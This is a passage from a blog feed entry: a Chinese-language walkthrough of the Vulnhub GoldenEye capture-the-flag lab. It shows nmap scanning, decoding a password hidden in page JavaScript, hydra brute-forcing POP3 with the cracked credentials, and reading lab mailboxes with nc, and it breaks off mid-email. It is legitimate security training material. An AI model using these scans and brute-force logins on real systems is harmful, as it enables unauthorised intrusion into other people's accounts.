<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>O X O X</title>
  <icon>https://www.gravatar.com/avatar/a234dd02f8f13336cd11d1c8fb96c523</icon>
  
  <link href="https://www.dansemal.cn/atom.xml" rel="self"/>
  
  <link href="https://www.dansemal.cn/"/>
  <updated>2022-08-14T06:19:20.000Z</updated>
  <id>https://www.dansemal.cn/</id>
  
  <author>
    <name>Dansemal</name>
    <email>dansemalrayo@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>001-Goldeneye</title>
    <link href="https://www.dansemal.cn/posts/243a10bf/"/>
    <id>https://www.dansemal.cn/posts/243a10bf/</id>
    <published>2022-08-14T07:21:00.000Z</published>
    <updated>2022-08-14T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="项目Goldeneye">项目Goldeneye</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">项目地址:https://www.vulnhub.com/entry/goldeneye-1,240/</span><br><span class="line"></span><br><span class="line">Name: GoldenEye: 1</span><br><span class="line">Date release: 4 May 2018</span><br><span class="line">Author: creosote</span><br><span class="line">Series: GoldenEye</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">I recently got done creating an OSCP type vulnerable machine that&#x27;s themed after the great James Bond film (and even better n64 game) GoldenEye. The goal is to get root and capture the secret GoldenEye codes - flag.txt.</span><br><span class="line"></span><br><span class="line">I&#x27;d rate it as Intermediate, it has a good variety of techniques needed to get root - no exploit development/buffer overflows. After completing the OSCP I think this would be a great one to practice on, plus there&#x27;s a hint of CTF flavor.</span><br><span class="line"></span><br><span class="line">I&#x27;ve created and validated on VMware and VirtualBox. You won&#x27;t need any extra tools other than what&#x27;s on Kali by default. Will need to be setup as Host-Only, and on VMware you may need to click &quot;retry&quot; if prompted, upon initially starting it up because of formatting.</span><br><span class="line">## Changelog Beta - 2018-05-02 v1 - 2018-05-04 </span><br></pre></td></tr></table></figure><h2 id="信息搜集">信息搜集</h2><h3 id="获取项目地址">获取项目地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.0.0.0/24</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sP 10.0.0.0/24</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 09:58 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> OpenWrt.lan (10.0.0.1)</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">MAC Address: 00:15:5D:64:C0:01 (Microsoft)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> PC-A.lan (10.0.0.2)</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">MAC Address: 00:15:5D:64:C0:00 (Microsoft)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ubuntu.lan (10.0.0.101)</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> kali.lan (10.0.0.3)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.07 seconds</span><br></pre></td></tr></table></figure><p>确定项目ip为 <mark class="hl-label default">10.0.0.101</mark> </p><h3 id="扫描项目端口">扫描项目端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap 10.0.0.101</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 13:36 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 01.lan (10.0.0.101)</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.33 seconds</span><br></pre></td></tr></table></figure><p>发现开放了80端口 25 smtp端口</p><p>目前信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.101</span><br><span class="line">port:25,80</span><br></pre></td></tr></table></figure><h3 id="访问80端口">访问80端口</h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1660887771-a500e9bd3ed3f434d984ad7681b8f237.webp" alt="image-20220819134248361"></p><p>得到信息   /sev-home/</p><p>访问此页面 有个弹窗 是个登录页面</p><p>接着查看主页面源代码 发现js文件有点奇怪</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">GoldenEyeText</span>: <span class="string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typeing&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; allElements.<span class="property">length</span>; j++) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentElementId = allElements[j].<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">var</span> currentElementIdContent = data[<span class="number">0</span>][currentElementId];</span><br><span class="line">  <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(currentElementId);</span><br><span class="line">  <span class="keyword">var</span> devTypeText = currentElementIdContent;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, isTag, text;</span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">type</span>(<span class="params"></span>) &#123;</span><br><span class="line">    text = devTypeText.<span class="title function_">slice</span>(<span class="number">0</span>, ++i);</span><br><span class="line">    <span class="keyword">if</span> (text === devTypeText) <span class="keyword">return</span>;</span><br><span class="line">    element.<span class="property">innerHTML</span> = text + <span class="string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;</span><br><span class="line">    <span class="keyword">var</span> char = text.<span class="title function_">slice</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&lt;&quot;</span>) isTag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&gt;&quot;</span>) isTag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTag) <span class="keyword">return</span> <span class="title function_">type</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(type, <span class="number">60</span>);</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//鲍里斯，确保你更新了你的默认密码。 </span><br><span class="line">//我的消息来源说MI6可能计划渗透。 </span><br><span class="line">//留意任何可疑的网络流量......</span><br><span class="line">//</span><br><span class="line">//我在下面给你编码了 p@ssword...</span><br><span class="line">//</span><br><span class="line">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97; &amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br><span class="line">//</span><br><span class="line">//顺便说一句，娜塔莉亚说她可以破解你的密码</span><br></pre></td></tr></table></figure><p>取出有用信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">已知信息</span><br><span class="line">ip:10.0.0.101</span><br><span class="line">port:25,80</span><br><span class="line">login:/sev-home/</span><br><span class="line">password:&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br><span class="line">此password不难看出为html实体编码</span><br><span class="line">解码后得到:InvincibleHack3r</span><br><span class="line"></span><br><span class="line">password:InvincibleHack3r</span><br><span class="line">name1=Boris</span><br><span class="line">name2=Natalya</span><br></pre></td></tr></table></figure><p>尝试用name 和password 进行登入</p><p>最终 name=boris;password=InvincibleHack3r登陆成功</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1660894577-22f808b32394aa98d428669440228375.webp" alt="image-20220819153612606"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GoldenEye 是一个绝密的苏联东方武器项目。  由于您有权访问，因此您肯定持有绝密许可并有资格成为经过认证的 GoldenEye 网络运营商 (GNO)</span><br><span class="line"></span><br><span class="line"> 请向合格的 GNO 主管发送电子邮件，以接受在线 GoldenEye 操作员培训，成为 GoldenEye 系统的管理员</span><br><span class="line"></span><br><span class="line"> 请记住，由于默默无闻的安全性非常有效，我们已将 pop3 服务配置为在非常高的非默认端口上运行</span><br></pre></td></tr></table></figure><p>根据信息能得知还有隐藏的端口  为pop3服务</p><h3 id="扫描隐藏端口服务">扫描隐藏端口服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 10.0.0.101</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nmap -p- 10.0.0.101</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 15:37 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 01.lan (10.0.0.101)</span><br><span class="line">Host is up (0.00089s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">55006/tcp open  unknown</span><br><span class="line">55007/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.15 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现 55006 55007端口 然后继续扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nmap -p55006,55007 10.0.0.101 -sS -sV -A -T5</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 15:39 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 01.lan (10.0.0.101)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">55006/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE PIPELINING UIDL USER SASL(PLAIN) CAPA RESP-CODES TOP</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">55007/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING UIDL SASL(PLAIN) STLS RESP-CODES AUTH-RESP-CODE CAPA USER TOP</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">MAC Address: 00:0C:29:75:99:20 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.06 ms 01.lan (10.0.0.101)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.25 seconds</span><br></pre></td></tr></table></figure><p>能确认55006 ssl/pop3 55007 pop3</p><p>那么接着使用九头蛇爆破pop3端口</p><h3 id="hydra-爆破pop3">hydra 爆破pop3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用上面 搜集的两个用户名进行爆破</span></span><br><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># cat success.txt</span></span><br><span class="line"><span class="comment"># Hydra v9.3 run at 2022-08-22 16:50:19 on 10.0.0.101 pop3 (hydra -L name.txt -P password.txt -o success.txt -t 64 -s 55007 10.0.0.101 pop3)</span></span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: boris   password: secret1!</span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: Boris   password: secret1!</span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: natalya   password: bird</span><br><span class="line">[55007][pop3] host: 10.0.0.101   login: Natalya   password: bird</span><br></pre></td></tr></table></figure><h3 id="nc登录pop3查看邮件">nc登录pop3查看邮件</h3><h4 id="boris的邮件">boris的邮件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nc 10.0.0.101 55007     </span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user Boris      <span class="comment"># 输入账号</span></span><br><span class="line">+OK</span><br><span class="line">pass secret1!<span class="comment"># 输入密码</span></span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 3 messages:</span><br><span class="line">1 544</span><br><span class="line">2 373</span><br><span class="line">3 921</span><br><span class="line">.</span><br><span class="line">retr 1<span class="comment">#读取邮件</span></span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鲍里斯，这是管理员。您可以在此处与同事和学生进行电子交流。我不会扫描电子邮件是否存在安全风险，因为我相信你和这里的其他管理员</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 鲍里斯，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 您与我们辛迪加的合作将获得丰厚回报。附件是 GoldenEye 的最终访问代码。将它们放在此服务器根目录中的隐藏文件中，然后从该电子邮件中删除。这些访问代码只能有一组，我们需要保护它们以供最终执行。如果他们被找回并被俘虏，我们的计划将会崩溃和燃烧！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 一旦 Xenia 进入培训站点并熟悉 GoldenEye 终端代码，我们将进入最后阶段......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - 保持安全，否则我们将受到威胁</span></span><br></pre></td></tr></table></figure><h4 id="natalya的邮件">natalya的邮件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nc 10.0.0.101 55007</span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user Natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 2 messages:</span><br><span class="line">1 631</span><br><span class="line">2 1048</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP <span class="built_in">id</span> D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#娜塔莉亚，请你不要再破坏鲍里斯的密码了。此外，您是 GNO 培训主管。一旦学生被指定给您，我将通过电子邮件发送给您。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#此外，请注意可能的网络漏洞。我们获悉 GoldenEye 正受到一个名为 Janus 的犯罪集团的追捕</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span 